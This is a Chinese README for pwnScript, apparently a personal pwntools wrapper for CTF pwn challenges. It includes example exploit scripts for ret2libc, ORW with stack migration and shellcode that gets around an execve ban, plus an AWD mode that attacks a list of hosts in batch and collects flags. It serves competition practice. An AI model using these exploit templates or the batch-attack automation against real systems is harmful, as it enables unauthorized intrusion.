# pwnScript



## 目录 

- [pwnScript](#pwnScript)
  - [目录](#目录)
  - [前言](#前言)
  - [简介](#简介)
  - [快速上手](#快速上手)
  - [教程](#教程)
  - [示例](#示例)
  - [TODO](#TODO)
    - [Libcsearcher](#Libcsearcher)
    - [Shellocde](#Shellocde)
    - [Heap](#Heap)
    - [~~Awd~~](#Awd)
  - [其它](#其它)

## 前言

之前写过一个pwn的script，主要是方便比赛中exp编写和调试。但是因为最初只是为了方便，导致现在很难迭代更新。所以打算重新写一个，目的还是方便自己使用。



## 简介

`pwnScript`我也才刚开始写，目前只有对本地local和远程remote的`pwntools`函数封装。再次重申，只是为了方便我打比赛时候写exp而已。如果真的需要一个很好用很方便的pwn工具，不妨去看看[RoderickChan/pwncli: Do pwn by command line (github.com)](https://github.com/RoderickChan/pwncli)。



目前（2.1.1）有的功能：

- 对pwntools常用命令封装如：send，recv，interactive等
- 简单的日志输出等级，可以自行调用
- debug调式
  - 配合tmux的debug断点使用
  - 或者会自动生成一个默认版本的gdb.sh，断点可以用raw_input暂停函数也可也自己调用ggdb设置断点等
- 简单的shellcode生成，和之前存的一些shellcode，都可以直接使用。
- 栈溢出的简单利用，ret2libc或者ret2orw等



2.1.2新增功能：

- awd自动化批量获取、打印、保存、提交flag。关于提交可能会由于目标平台不同方式不同，这部分预留接口，可以在比赛中自行更改。
- 完善了使用ropper进行gadgets获取时，需要每次都search一次，在进行awd批量进行时会非常耗时，这里优化了该部分代码，将可找到的gadget存放在当前目录的文件中，以便之后使用。存放原则是只在调用远程时使用。



## 快速上手

脚本基于`pwntools`，`ae64`开发，所以只需要安装所需库即可使用。

https://github.com/Gallopsled/pwntools.git

https://github.com/veritas501/ae64.git

之后安装该脚本即可。（~~目前也不打算开源~~（因为写的很烂。。），再次重申，如果需要可以直接去使用`pwncli`，之前我也在用，但是由于我水平有限，有些功能不知道咋搞，就打算自己写自己用）

```bash
pip install .
```

```bash
pip install pwn-ckyan-2.1.1.tar.gz
```



## 教程

```sh
pwnScript --version
```

```sh
PwnScript: version 2.1.2
Author: ckyan
Email:  comentropy@foxmail.com
GitHub: https://github.com/c0mentropy/ckyan.pwnScript
```



```sh
pwnScript --help
```

```sh
usage: pwnScript [-h] [-V] {auto,run,debug,de,remote,re,blasting,bl} ...

Description: pwnScript is a tools for exploiting vuln in ELF files.

positional arguments:
  {auto,run,debug,de,remote,re,blasting,bl}
                        Available Commands
    auto (run)          Automatically detect attacks
    debug (de)          Attack locally
    remote (re)         Attack remotely
    blasting (bl)       Attack blow up

options:
  -h, --help            show this help message and exit
  -V, --version         Show the version and exit.
```



本地调试

```sh
pwnScript debug --help
```

```sh
usage: pwnScript debug [-h] -f FILE

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  File to debug
```



远程调试

```sh
pwnScript remote --help
```

```sh
usage: pwnScript remote [-h] [-u [URL ...]] [-i IP] [-p PORT] [-f FILE] [-l LIBC]

options:
  -h, --help            show this help message and exit
  -u [URL ...], --url [URL ...]
                        URL address of remote server
  -i IP, --ip IP        IP address of remote server
  -p PORT, --port PORT  Port number of remote server
  -f FILE, --file FILE  File to debug
  -l LIBC, --libc LIBC  File to debug
```



示例：

```sh
Local:
    python3 exp.py debug --file ./pwn
Remote:
    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
```



主要还是方便exp的编写，exp编写示例：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Help: 
    python3 exp.py --help
    python3 exp.py debug --help
    python3 exp.py remote --help
Local:
    python3 exp.py debug --file ./pwn
Remote:
    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
'''

# ./exp.py de -f ./pwn
# ./exp.py re -f ./pwn -u ""

from ckyan.pwnScript import *

def exp():
    pandora_box.init_script()

    elf = pandora_box.elf
    libc = pandora_box.libc
    p = pandora_box.conn


if __name__ == '__main__':
    exp()

```



## 示例

栈溢出利用，

ret2libc

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Help: 
    python3 exp.py --help
    python3 exp.py debug --help
    python3 exp.py remote --help
Local:
    python3 exp.py debug --file ./pwn
Remote:
    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
'''

from ckyan.pwnScript import *

def exp():
    pandora_box.init_script()

    elf = pandora_box.elf
    libc = pandora_box.libc
    p = pandora_box.conn
    rop_attack = pandora_box.ropper_attack

    padding = 0x10 + 8
    main_addr = 0x40123D
    
    rop_attack.set_padding(padding=padding)
    
    ru(b'Input: ')
    rop_attack.puts(target_addr=elf.got['puts'], 
                    return_func_addr=main_addr,
                    is_send=True)

    put_addr = r7f()
    libc_base = put_addr - libc.sym['puts']
    set_libc_base_and_log(libc_base)

    ru(b'Input: ')
    rop_attack.get_shell()


if __name__ == '__main__':
    exp()

```

orw

开放open read write：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Help: 
    python3 exp.py --help
    python3 exp.py debug --help
    python3 exp.py remote --help
Local:
    python3 exp.py debug --file ./pwn
Remote:
    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
'''

from ckyan.pwnScript import *

def exp():

    pandora_box.init_script()

    elf = pandora_box.elf
    libc = pandora_box.libc
    p = pandora_box.conn
    rop_attack = pandora_box.ropper_attack

    padding = 0x100 + 8
    main_addr = 0x40130C

    rop_attack.set_padding(padding=padding)

    ru(b'this task.\n')
    rop_attack.puts(target_addr=elf.got['puts'],
                    return_func_addr=main_addr,
                    is_send=True)

    libc_base = r7f() - libc.sym['puts']
    set_libc_base_and_log(libc_base)

    rop_attack.update_padding(padding=padding-8)
    
    stack_migration_addr = 0x404048
    leave_ret_addr = rop_attack.search_gadgets('leave;ret')
    
    ru(b'this task.\n')
    rop_attack.read(rbp_value=stack_migration_addr,
                    target_addr=stack_migration_addr,
                    return_func_addr=leave_ret_addr,
                    is_send=True)

    rop_attack.update_padding(padding=0)

    flag_name_str_addr = 0x404038
    flag_addr = 0x404048

    rop_attack.orw_cat_flag(
        flag_name_str_addr=flag_name_str_addr,
        flag_addr=flag_addr,
        flag_prefix=b'XAUTCTF'
        )


if __name__ == '__main__':
    exp()

```



禁execve

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Help: 
    python3 exp.py --help
    python3 exp.py debug --help
    python3 exp.py remote --help
Local:
    python3 exp.py debug --file ./pwn
Remote:
    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
'''

from ckyan.pwnScript import *

def exp():

    pandora_box.init_script()

    elf = pandora_box.elf
    libc = pandora_box.libc
    p = pandora_box.conn
    rop_attack = pandora_box.ropper_attack

    padding = 0x100 + 8
    main_addr = 0x40130C

    rop_attack.set_padding(padding=padding)

    ru(b'this task.\n')
    rop_attack.puts(target_addr=elf.got['puts'],
                    return_func_addr=main_addr,
                    is_send=True)

    libc_base = r7f() - libc.sym['puts']
    set_libc_base_and_log(libc_base)

    rop_attack.update_padding(padding=padding-8)
    
    stack_migration_addr = 0x404048
    leave_ret_addr = rop_attack.search_gadgets('leave;ret')
    
    ru(b'this task.\n')
    rop_attack.read(rbp_value=stack_migration_addr,
                    target_addr=stack_migration_addr,
                    return_func_addr=leave_ret_addr,
                    is_send=True)

    rop_attack.update_padding(padding=0)

    # padding + 0x48
    # shellcode_addr = stack_migration_addr + 0x50

    rop_attack.orw_from_shellcode_cat_flag(
        target_addr=main_addr,
        mprotect_start_addr=stack_migration_addr,
        # return_func_addr=shellcode_addr,
        flag_prefix=b"XAUTCTF",
        is_send=True,
    )

if __name__ == '__main__':
    exp()

```



awd示例：

```bash
python exp.py auto
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Help: 
    python3 exp.py --help
    python3 exp.py debug --help
    python3 exp.py remote --help
Local:
    python3 exp.py debug --file ./pwn
Remote:
    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
'''

from ckyan.pwnScript import *

def exp():

    pandora_box.init_script()

    elf = pandora_box.elf
    libc = pandora_box.libc
    p = pandora_box.conn
    rop_attack = pandora_box.ropper_attack

    padding = 0x100 + 8
    main_addr = 0x40130C

    rop_attack.set_padding(padding=padding)

    ru(b'this task.\n')
    rop_attack.puts(target_addr=elf.got['puts'],
                    return_func_addr=main_addr,
                    is_send=True)

    libc_base = r7f() - libc.sym['puts']
    set_libc_base_and_log(libc_base)

    rop_attack.update_padding(padding=padding-8)
    
    stack_migration_addr = 0x404048
    leave_ret_addr = rop_attack.search_gadgets('leave;ret')
    
    ru(b'this task.\n')
    rop_attack.read(rbp_value=stack_migration_addr,
                    target_addr=stack_migration_addr,
                    return_func_addr=leave_ret_addr,
                    is_send=True)

    rop_attack.update_padding(padding=0)

    flag_name_str_addr = 0x404038
    flag_addr = 0x404048

    flag = rop_attack.orw_cat_flag(
        flag_name_str_addr=flag_name_str_addr,
        flag_addr=flag_addr,
        flag_prefix=b'XAUTCTF'
        )

    return flag

if __name__ == '__main__':
    # exp()
    awd = Awd(
        hosts_file="./datas/hosts.txt",
        # static_ip="127.0.0.1",
        # ports_file="./datas/ports.txt",
        flags_path="./flags/",
        flags_file_name_sign="1",
        binary="./vuln",
        remote_libc="./libc.so.6",
        exploit=exp)
    
    awd.attack(print_flag=True, send_flag=False, save_flag=True)

```





## TODO

### Libcsearcher

有时候比赛不出网，哎，就得自己本地搞一个searcher。



### Shellcode

现在比赛有一些专门考shellcode的题，ascii，长度限制等，目前在用一个开源项目ae64，而alpha3不支持python3，所以todo就说把alpha3改成python3版本。



### Heap

- fuzz
  - uaf
  - overflow
    - off by one
    - off by null
    - off by any
  - remote glibc version
    - double : fastbin or tcache
- glibc
  - glibc-2.23
    - fastbin
    - unsortedbin leak libc
  - glibc-2.27
    - tcache -> fastbin
    - tcache -> unsortedbin leak libc
  - glibc-2.31
    - orw rdi -> rdx
    - tcache check double free
  - glibc-2.32
    - tcache key
  - glibc-2.35
    - House of (Cancel All Hook)
- exploit
  - overflow
    - unlink
    - Chunk Extend and Overlapping
    - construct uaf
  - uaf
    - fastbin attack
    - largebin attack
    - malloc hook && free hook
    - house of apple1 ~ 3
  - back door
- musl
- ...



### ~~Awd~~

~~然后就是awd的一些脚本，配合pwnScript使用，自动攻击，自动提交flag等。~~



## 其它

水平一般，代码很烂，如有bug，欢迎吐槽。但希望不要言语攻击QAQ，骂了就哭 :(

